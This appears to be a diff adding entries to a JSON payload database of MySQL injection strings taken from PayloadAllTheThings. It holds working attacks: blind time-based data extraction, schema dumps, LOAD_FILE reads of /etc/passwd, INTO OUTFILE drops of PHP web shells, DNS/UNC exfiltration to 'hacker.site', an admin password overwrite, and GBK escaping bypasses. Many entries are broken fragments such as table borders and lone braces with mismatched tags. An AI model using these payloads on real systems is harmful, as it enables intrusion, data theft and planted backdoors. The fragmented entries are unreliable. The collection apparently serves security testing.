+      "category": "sqli-mysql",
+      "source": "PayloadAllTheThings-MySQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": [
+        "time-based",
+        "boolean-based",
+        "comment-injection"
+      ]
+    },
+    {
+      "id": "PL-E614E5B9DB91",
+      "content": "1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE 'SW___')#",
+      "category": "sqli-mysql",
+      "source": "PayloadAllTheThings-MySQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": [
+        "time-based",
+        "boolean-based",
+        "comment-injection"
+      ]
+    },
+    {
+      "id": "PL-FACE942002FB",
+      "content": "1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE 'SWA__')#",
+      "category": "sqli-mysql",
+      "source": "PayloadAllTheThings-MySQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": [
+        "time-based",
+        "boolean-based",
+        "comment-injection"
+      ]
+    },
+    {
+      "id": "PL-541F951B4EF6",
+      "content": "1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE 'SWB__')#",
+      "category": "sqli-mysql",
+      "source": "PayloadAllTheThings-MySQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": [
+        "time-based",
+        "boolean-based",
+        "comment-injection"
+      ]
+    },
+    {
+      "id": "PL-B45D37CBE451",
+      "content": "1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE 'SWI__')#",
+      "category": "sqli-mysql",
+      "source": "PayloadAllTheThings-MySQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": [
+        "time-based",
+        "boolean-based",
+        "comment-injection"
+      ]
+    },
+    {
+      "id": "PL-03CD144D8E5A",
+      "content": "1 AND (SELECT SLEEP(10) FROM DUAL WHERE (SELECT table_name FROM information_schema.columns WHERE table_schema=DATABASE() AND column_name LIKE '%pass%' LIMIT 0,1) LIKE '%')#",
+      "category": "sqli-mysql",
+      "source": "PayloadAllTheThings-MySQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": [
+        "time-based",
+        "boolean-based",
+        "comment-injection"
+      ]
+    },
+    {
+      "id": "PL-1BD988B50C45",
+      "content": "?id=1 AND IF(ASCII(SUBSTRING((SELECT USER()),1,1))>=100,1, BENCHMARK(2000000,MD5(NOW()))) --",
+      "category": "sqli-mysql",
+      "source": "PayloadAllTheThings-MySQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": [
+        "boolean-based",
+        "comment-injection"
+      ]
+    },
+    {
+      "id": "PL-8DE4125B4678",
+      "content": "?id=1 AND IF(ASCII(SUBSTRING((SELECT USER()), 1, 1))>=100, 1, SLEEP(3)) --",
+      "category": "sqli-mysql",
+      "source": "PayloadAllTheThings-MySQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": [
+        "time-based",
+        "boolean-based",
+        "comment-injection"
+      ]
+    },
+    {
+      "id": "PL-B7AD3422F10E",
+      "content": "?id=1 OR IF(MID(@@version,1,1)='5',sleep(1),1)='2",
+      "category": "sqli-mysql",
+      "source": "PayloadAllTheThings-MySQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": [
+        "time-based",
+        "boolean-based"
+      ]
+    },
+    {
+      "id": "PL-6F2D9F8C9438",
+      "content": "(select (@) from (select(@:=0x00),(select (@) from (information_schema.columns) where (table_schema>=@) and (@)in (@:=concat(@,0x0D,0x0A,' [ ',table_schema,' ] > ',table_name,' > ',column_name,0x7C))))a)#",
+      "category": "sqli-mysql",
+      "source": "PayloadAllTheThings-MySQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": [
+        "boolean-based",
+        "comment-injection"
+      ]
+    },
+    {
+      "id": "PL-05D29C06F72E",
+      "content": "(select (@) from (select(@:=0x00),(select (@) from (db_data.table_data) where (@)in (@:=concat(@,0x0D,0x0A,0x7C,' [ ',column_data1,' ] > ',column_data2,' > ',0x7C))))a)#",
+      "category": "sqli-mysql",
+      "source": "PayloadAllTheThings-MySQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": [
+        "comment-injection"
+      ]
+    },
+    {
+      "id": "PL-2A6BB0237D4F",
+      "content": "make_set(6,@:=0x0a,(select(1)from(information_schema.columns)where@:=make_set(511,@,0x3c6c693e,table_name,column_name)),@)",
+      "category": "sqli-mysql",
+      "source": "PayloadAllTheThings-MySQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": [
+        "boolean-based"
+      ]
+    },
+    {
+      "id": "PL-2D2AF9A4200C",
+      "content": "(select(@)from(select(@:=0x00),(select(@)from(information_schema.columns)where(@)in(@:=concat(@,0x3C62723E,table_name,0x3a,column_name))))a)",
+      "category": "sqli-mysql",
+      "source": "PayloadAllTheThings-MySQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": [
+        "boolean-based"
+      ]
+    },
+    {
+      "id": "PL-22FD4DE340A8",
+      "content": "(select(select concat(@:=0xa7,(select count(*)from(information_schema.columns)where(@:=concat(@,0x3c6c693e,table_name,0x3a,column_name))),@))",
+      "category": "sqli-mysql",
+      "source": "PayloadAllTheThings-MySQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": [
+        "boolean-based"
+      ]
+    },
+    {
+      "id": "PL-7F1FBCB31282",
+      "content": "(Select export_set(5,@:=0,(select count(*)from(information_schema.columns)where@:=export_set(5,export_set(5,@,table_name,0x3c6c693e,2),column_name,0xa3a,2)),@,2))",
+      "category": "sqli-mysql",
+      "source": "PayloadAllTheThings-MySQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": [
+        "boolean-based"
+      ]
+    },
+    {
+      "id": "PL-FF5B518BA4F0",
+      "content": "+make_set(6,@:=0x0a,(select(1)from(information_schema.columns)where@:=make_set(511,@,0x3c6c693e,table_name,column_name)),@)",
+      "category": "sqli-mysql",
+      "source": "PayloadAllTheThings-MySQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": [
+        "boolean-based"
+      ]
+    },
+    {
+      "id": "PL-769D1576F10A",
+      "content": "(select(@a)from(select(@a:=0x00),(select(@a)from(information_schema.columns)where(table_schema!=0x696e666f726d6174696f6e5f736368656d61)and(@a)in(@a:=concat(@a,table_name,0x203a3a20,column_name,0x3c62723e))))a)",
+      "category": "sqli-mysql",
+      "source": "PayloadAllTheThings-MySQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": [
+        "boolean-based"
+      ]
+    },
+    {
+      "id": "PL-F194EC3E2237",
+      "content": "SELECT * FROM INFORMATION_SCHEMA.PROCESSLIST;",
+      "category": "sqli-mysql",
+      "source": "PayloadAllTheThings-MySQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": [
+        "boolean-based"
+      ]
+    },
+    {
+      "id": "PL-1684E454B629",
+      "content": "UNION SELECT 1,state,info,4 FROM INFORMATION_SCHEMA.PROCESSLIST #",
+      "category": "sqli-mysql",
+      "source": "PayloadAllTheThings-MySQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": [
+        "union-based",
+        "boolean-based",
+        "comment-injection"
+      ]
+    },
+    {
+      "id": "PL-CBD492BD7CA5",
+      "content": "UNION SELECT 1,(SELECT(@)FROM(SELECT(@:=0X00),(SELECT(@)FROM(information_schema.processlist)WHERE(@)IN(@:=CONCAT(@,0x3C62723E,state,0x3a,info))))a),3,4 #",
+      "category": "sqli-mysql",
+      "source": "PayloadAllTheThings-MySQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": [
+        "union-based",
+        "boolean-based",
+        "comment-injection"
+      ]
+    },
+    {
+      "id": "PL-3AA946FEC3FF",
+      "content": "UNION ALL SELECT LOAD_FILE('/etc/passwd') --",
+      "category": "sqli-mysql",
+      "source": "PayloadAllTheThings-MySQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": [
+        "union-based",
+        "comment-injection",
+        "file-access"
+      ]
+    },
+    {
+      "id": "PL-68E687D11005",
+      "content": "UNION ALL SELECT TO_base64(LOAD_FILE('/var/www/html/index.php'));",
+      "category": "sqli-mysql",
+      "source": "PayloadAllTheThings-MySQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": [
+        "union-based",
+        "file-access"
+      ]
+    },
+    {
+      "id": "PL-D50371899F6B",
+      "content": "GRANT FILE ON *.* TO 'root'@'localhost'; FLUSH PRIVILEGES;#",
+      "category": "sqli-mysql",
+      "source": "PayloadAllTheThings-MySQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": [
+        "comment-injection"
+      ]
+    },
+    {
+      "id": "PL-55A872E2F5F0",
+      "content": "[...] UNION SELECT \"<?php system($_GET['cmd']); ?>\" into outfile \"C:\\\\xampp\\\\htdocs\\\\backdoor.php\"",
+      "category": "sqli-mysql",
+      "source": "PayloadAllTheThings-MySQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": [
+        "union-based",
+        "boolean-based",
+        "file-access"
+      ]
+    },
+    {
+      "id": "PL-0F94CE6F16EE",
+      "content": "[...] UNION SELECT '' INTO OUTFILE '/var/www/html/x.php' FIELDS TERMINATED BY '<?php phpinfo();?>'",
+      "category": "sqli-mysql",
+      "source": "PayloadAllTheThings-MySQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": [
+        "union-based",
+        "file-access"
+      ]
+    },
+    {
+      "id": "PL-484706703575",
+      "content": "[...] UNION SELECT 1,2,3,4,5,0x3c3f70687020706870696e666f28293b203f3e into outfile 'C:\\\\wamp\\\\www\\\\pwnd.php'-- -",
+      "category": "sqli-mysql",
+      "source": "PayloadAllTheThings-MySQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": [
+        "union-based",
+        "comment-injection",
+        "file-access"
+      ]
+    },
+    {
+      "id": "PL-132B3375FFD8",
+      "content": "[...] union all select 1,2,3,4,\"<?php echo shell_exec($_GET['cmd']);?>\",6 into OUTFILE 'c:/inetpub/wwwroot/backdoor.php'",
+      "category": "sqli-mysql",
+      "source": "PayloadAllTheThings-MySQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": [
+        "union-based",
+        "boolean-based",
+        "file-access"
+      ]
+    },
+    {
+      "id": "PL-667B199B2188",
+      "content": "[...] UNION SELECT 0xPHP_PAYLOAD_IN_HEX, NULL, NULL INTO DUMPFILE 'C:/Program Files/EasyPHP-12.1/www/shell.php'",
+      "category": "sqli-mysql",
+      "source": "PayloadAllTheThings-MySQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": [
+        "union-based"
+      ]
+    },
+    {
+      "id": "PL-70B9E86150BE",
+      "content": "[...] UNION SELECT 0x3c3f7068702073797374656d28245f4745545b2763275d293b203f3e INTO DUMPFILE '/var/www/html/images/shell.php';",
+      "category": "sqli-mysql",
+      "source": "PayloadAllTheThings-MySQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": [
+        "union-based"
+      ]
+    },
+    {
+      "id": "PL-88D01DB0016E",
+      "content": "$ whereis lib_mysqludf_sys.so",
+      "category": "sqli-mysql",
+      "source": "PayloadAllTheThings-MySQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": []
+    },
+    {
+      "id": "PL-AC405E7C5B5B",
+      "content": "/usr/lib/lib_mysqludf_sys.so",
+      "category": "sqli-mysql",
+      "source": "PayloadAllTheThings-MySQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": []
+    },
+    {
+      "id": "PL-D465E929180A",
+      "content": "$ mysql -u root -p mysql",
+      "category": "sqli-mysql",
+      "source": "PayloadAllTheThings-MySQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": []
+    },
+    {
+      "id": "PL-2B954E752A1D",
+      "content": "Enter password: [...]",
+      "category": "sqli-mysql",
+      "source": "PayloadAllTheThings-MySQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": [
+        "boolean-based"
+      ]
+    },
+    {
+      "id": "PL-9ED0D410A5FA",
+      "content": "mysql> SELECT sys_eval('id');",
+      "category": "sqli-mysql",
+      "source": "PayloadAllTheThings-MySQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": []
+    },
+    {
+      "id": "PL-ABE50B514A4B",
+      "content": "+--------------------------------------------------+",
+      "category": "sqli-mysql",
+      "source": "PayloadAllTheThings-MySQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": [
+        "comment-injection"
+      ]
+    },
+    {
+      "id": "PL-18F4D6293BA7",
+      "content": "| sys_eval('id') |",
+      "category": "sqli-mysql",
+      "source": "PayloadAllTheThings-MySQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": []
+    },
+    {
+      "id": "PL-F46507BB1C2F",
+      "content": "| uid=118(mysql) gid=128(mysql) groups=128(mysql) |",
+      "category": "sqli-mysql",
+      "source": "PayloadAllTheThings-MySQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": []
+    },
+    {
+      "id": "PL-E07BDAEAFAF0",
+      "content": "attacker_dummy@example.com\", \"P@ssw0rd\"), (\"admin@example.com\", \"P@ssw0rd\") ON DUPLICATE KEY UPDATE password=\"P@ssw0rd\" --",
+      "category": "sqli-mysql",
+      "source": "PayloadAllTheThings-MySQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": [
+        "boolean-based",
+        "comment-injection"
+      ]
+    },
+    {
+      "id": "PL-92C268D1472E",
+      "content": "INSERT INTO users (email, password) VALUES (\"attacker_dummy@example.com\", \"BCRYPT_HASH\"), (\"admin@example.com\", \"P@ssw0rd\") ON DUPLICATE KEY UPDATE password=\"P@ssw0rd\" -- \", \"BCRYPT_HASH_OF_YOUR_PASSWORD_INPUT\");",
+      "category": "sqli-mysql",
+      "source": "PayloadAllTheThings-MySQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": [
+        "boolean-based",
+        "comment-injection"
+      ]
+    },
+    {
+      "id": "PL-140C1A40FCAB",
+      "content": "`username` varchar(20) not null",
+      "category": "sqli-mysql",
+      "source": "PayloadAllTheThings-MySQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": []
+    },
+    {
+      "id": "PL-0E0204FA7DDA",
+      "content": "SELECT @@version INTO OUTFILE '\\\\\\\\192.168.0.100\\\\temp\\\\out.txt';",
+      "category": "sqli-mysql",
+      "source": "PayloadAllTheThings-MySQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": [
+        "file-access"
+      ]
+    },
+    {
+      "id": "PL-563F627A45FA",
+      "content": "SELECT @@version INTO DUMPFILE '\\\\\\\\192.168.0.100\\\\temp\\\\out.txt;",
+      "category": "sqli-mysql",
+      "source": "PayloadAllTheThings-MySQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": []
+    },
+    {
+      "id": "PL-6074B7BBAE63",
+      "content": "SELECT LOAD_FILE(CONCAT('\\\\\\\\',VERSION(),'.hacker.site\\\\a.txt'));",
+      "category": "sqli-mysql",
+      "source": "PayloadAllTheThings-MySQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": [
+        "file-access"
+      ]
+    },
+    {
+      "id": "PL-9F0CD84CA7DF",
+      "content": "SELECT LOAD_FILE(CONCAT(0x5c5c5c5c,VERSION(),0x2e6861636b65722e736974655c5c612e747874))",
+      "category": "sqli-mysql",
+      "source": "PayloadAllTheThings-MySQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": [
+        "file-access"
+      ]
+    },
+    {
+      "id": "PL-AE0A6CB0A993",
+      "content": "SELECT LOAD_FILE('\\\\\\\\error\\\\abc');",
+      "category": "sqli-mysql",
+      "source": "PayloadAllTheThings-MySQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": [
+        "boolean-based",
+        "file-access"
+      ]
+    },
+    {
+      "id": "PL-B13D81E30CD8",
+      "content": "SELECT LOAD_FILE(0x5c5c5c5c6572726f725c5c616263);",
+      "category": "sqli-mysql",
+      "source": "PayloadAllTheThings-MySQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": [
+        "file-access"
+      ]
+    },
+    {
+      "id": "PL-672BA029B7F0",
+      "content": "SELECT '' INTO DUMPFILE '\\\\\\\\error\\\\abc';",
+      "category": "sqli-mysql",
+      "source": "PayloadAllTheThings-MySQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": [
+        "boolean-based"
+      ]
+    },
+    {
+      "id": "PL-CA0F00BF4D58",
+      "content": "SELECT '' INTO OUTFILE '\\\\\\\\error\\\\abc';",
+      "category": "sqli-mysql",
+      "source": "PayloadAllTheThings-MySQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": [
+        "boolean-based",
+        "file-access"
+      ]
+    },
+    {
+      "id": "PL-AA1D37E45EF9",
+      "content": "LOAD DATA INFILE '\\\\\\\\error\\\\abc' INTO TABLE DATABASE.TABLE_NAME;",
+      "category": "sqli-mysql",
+      "source": "PayloadAllTheThings-MySQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": [
+        "boolean-based"
+      ]
+    },
+    {
+      "id": "PL-6BE31691A095",
+      "content": "SELECT * FROM mysql.innodb_table_stats;",
+      "category": "sqli-mysql",
+      "source": "PayloadAllTheThings-MySQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": []
+    },
+    {
+      "id": "PL-295C9333F57D",
+      "content": "+----------------+-----------------------+---------------------+--------+----------------------+--------------------------+",
+      "category": "sqli-mysql",
+      "source": "PayloadAllTheThings-MySQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": [
+        "comment-injection"
+      ]
+    },
+    {
+      "id": "PL-FEA83D96FF0B",
+      "content": "| database_name  | table_name            | last_update         | n_rows | clustered_index_size | sum_of_other_index_sizes |",
+      "category": "sqli-mysql",
+      "source": "PayloadAllTheThings-MySQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": []
+    },
+    {
+      "id": "PL-D35B8FBA8902",
+      "content": "| dvwa           | guestbook             | 2017-01-19 21:02:57 |      0 |                    1 |                        0 |",
+      "category": "sqli-mysql",
+      "source": "PayloadAllTheThings-MySQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": []
+    },
+    {
+      "id": "PL-76B191F55DC0",
+      "content": "| dvwa           | users                 | 2017-01-19 21:03:07 |      5 |                    1 |                        0 |",
+      "category": "sqli-mysql",
+      "source": "PayloadAllTheThings-MySQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": []
+    },
+    {
+      "id": "PL-2F43B42FD833",
+      "content": "...",
+      "category": "sqli-mysql",
+      "source": "PayloadAllTheThings-MySQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": []
+    },
+    {
+      "id": "PL-378D867C59A1",
+      "content": "mysql> SHOW TABLES IN dvwa;",
+      "category": "sqli-mysql",
+      "source": "PayloadAllTheThings-MySQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": []
+    },
+    {
+      "id": "PL-C1098C42C660",
+      "content": "+----------------+",
+      "category": "sqli-mysql",
+      "source": "PayloadAllTheThings-MySQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": [
+        "comment-injection"
+      ]
+    },
+    {
+      "id": "PL-C6277D1EA9E7",
+      "content": "| Tables_in_dvwa |",
+      "category": "sqli-mysql",
+      "source": "PayloadAllTheThings-MySQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": []
+    },
+    {
+      "id": "PL-7905B1A72644",
+      "content": "| guestbook      |",
+      "category": "sqli-mysql",
+      "source": "PayloadAllTheThings-MySQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": []
+    },
+    {
+      "id": "PL-16563A1C04F0",
+      "content": "| users          |",
+      "category": "sqli-mysql",
+      "source": "PayloadAllTheThings-MySQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": []
+    },
+    {
+      "id": "PL-A3A84CB15C79",
+      "content": "mysql> SELECT @@innodb_version;",
+      "category": "sqli-mysql",
+      "source": "PayloadAllTheThings-MySQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": []
+    },
+    {
+      "id": "PL-DDB739E1CEBF",
+      "content": "+------------------+",
+      "category": "sqli-mysql",
+      "source": "PayloadAllTheThings-MySQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": [
+        "comment-injection"
+      ]
+    },
+    {
+      "id": "PL-31B972398834",
+      "content": "| @@innodb_version |",
+      "category": "sqli-mysql",
+      "source": "PayloadAllTheThings-MySQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": []
+    },
+    {
+      "id": "PL-6CDAE2DAB35C",
+      "content": "| 5.6.31           |",
+      "category": "sqli-mysql",
+      "source": "PayloadAllTheThings-MySQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": []
+    },
+    {
+      "id": "PL-5E7FE9A59DC6",
+      "content": "mysql> SELECT @@version;",
+      "category": "sqli-mysql",
+      "source": "PayloadAllTheThings-MySQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": []
+    },
+    {
+      "id": "PL-E856AED9CA65",
+      "content": "+-------------------------+",
+      "category": "sqli-mysql",
+      "source": "PayloadAllTheThings-MySQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": [
+        "comment-injection"
+      ]
+    },
+    {
+      "id": "PL-9118F6AE05E3",
+      "content": "| @@version               |",
+      "category": "sqli-mysql",
+      "source": "PayloadAllTheThings-MySQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": []
+    },
+    {
+      "id": "PL-ACEB0DDD4151",
+      "content": "| 5.6.31-0ubuntu0.15.10.1 |",
+      "category": "sqli-mysql",
+      "source": "PayloadAllTheThings-MySQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": []
+    },
+    {
+      "id": "PL-C96986DEA23F",
+      "content": "mysql> SELECT version();",
+      "category": "sqli-mysql",
+      "source": "PayloadAllTheThings-MySQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": []
+    },
+    {
+      "id": "PL-AB1F85190EED",
+      "content": "| version()               |",
+      "category": "sqli-mysql",
+      "source": "PayloadAllTheThings-MySQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": []
+    },
+    {
+      "id": "PL-356B4E4B52A8",
+      "content": "mysql> SELECT @@GLOBAL.VERSION;",
+      "category": "sqli-mysql",
+      "source": "PayloadAllTheThings-MySQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": []
+    },
+    {
+      "id": "PL-FA1870902391",
+      "content": "| @@GLOBAL.VERSION |",
+      "category": "sqli-mysql",
+      "source": "PayloadAllTheThings-MySQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": []
+    },
+    {
+      "id": "PL-4F9948C307DE",
+      "content": "| 8.0.27           |",
+      "category": "sqli-mysql",
+      "source": "PayloadAllTheThings-MySQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": []
+    },
+    {
+      "id": "PL-37090E27BCEC",
+      "content": "SELECT json_arrayagg(concat_ws(0x3a,table_schema,table_name)) from INFORMATION_SCHEMA.TABLES;",
+      "category": "sqli-mysql",
+      "source": "PayloadAllTheThings-MySQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": [
+        "boolean-based"
+      ]
+    },
+    {
+      "id": "PL-0E5740948286",
+      "content": "%A8%27 OR 1=1;--",
+      "category": "sqli-mysql",
+      "source": "PayloadAllTheThings-MySQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": [
+        "boolean-based",
+        "comment-injection"
+      ]
+    },
+    {
+      "id": "PL-D08986591867",
+      "content": "%8C%A8%27 OR 1=1--",
+      "category": "sqli-mysql",
+      "source": "PayloadAllTheThings-MySQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": [
+        "boolean-based",
+        "comment-injection"
+      ]
+    },
+    {
+      "id": "PL-2804E8CA869E",
+      "content": "%bf' OR 1=1 -- --",
+      "category": "sqli-mysql",
+      "source": "PayloadAllTheThings-MySQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": [
+        "boolean-based",
+        "comment-injection"
+      ]
+    },
+    {
+      "id": "PL-E8CC969852E7",
+      "content": "function check_addslashes($string)",
+      "category": "sqli-mysql",
+      "source": "PayloadAllTheThings-MySQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": []
+    },
+    {
+      "id": "PL-F95B70FDC308",
+      "content": "{",
+      "category": "sqli-mysql",
+      "source": "PayloadAllTheThings-MySQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": []
+    },
+    {
+      "id": "PL-257D980D1052",
+      "content": "$string = preg_replace('/'. preg_quote('\\\\') .'/', \"\\\\\\\\\\\\\", $string);          //escape any backslash",
+      "category": "sqli-mysql",
+      "source": "PayloadAllTheThings-MySQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": []
+    },
+    {
+      "id": "PL-AC4ECB4F9E4E",
+      "content": "$string = preg_replace('/\\'/i', '\\\\\\'', $string);                               //escape single quote with a backslash",
+      "category": "sqli-mysql",
+      "source": "PayloadAllTheThings-MySQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": []
+    },
+    {
+      "id": "PL-F1E00608BF86",
+      "content": "$string = preg_replace('/\\\"/', \"\\\\\\\"\", $string);                                //escape double quote with a backslash",
+      "category": "sqli-mysql",
+      "source": "PayloadAllTheThings-MySQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": []
+    },
+    {
+      "id": "PL-54438E2CC6BC",
+      "content": "return $string;",
+      "category": "sqli-mysql",
+      "source": "PayloadAllTheThings-MySQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": []
+    },
+    {
+      "id": "PL-CBB184DD8E05",
+      "content": "}",
+      "category": "sqli-mysql",
+      "source": "PayloadAllTheThings-MySQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": []
+    },
+    {
+      "id": "PL-6C00F1AB644E",
+      "content": "$id=check_addslashes($_GET['id']);",
+      "category": "sqli-mysql",
+      "source": "PayloadAllTheThings-MySQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": []
+    },
+    {
+      "id": "PL-86910D36631B",
+      "content": "mysql_query(\"SET NAMES gbk\");",
+      "category": "sqli-mysql",
+      "source": "PayloadAllTheThings-MySQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": []
+    },
+    {
+      "id": "PL-F1288EE829C0",
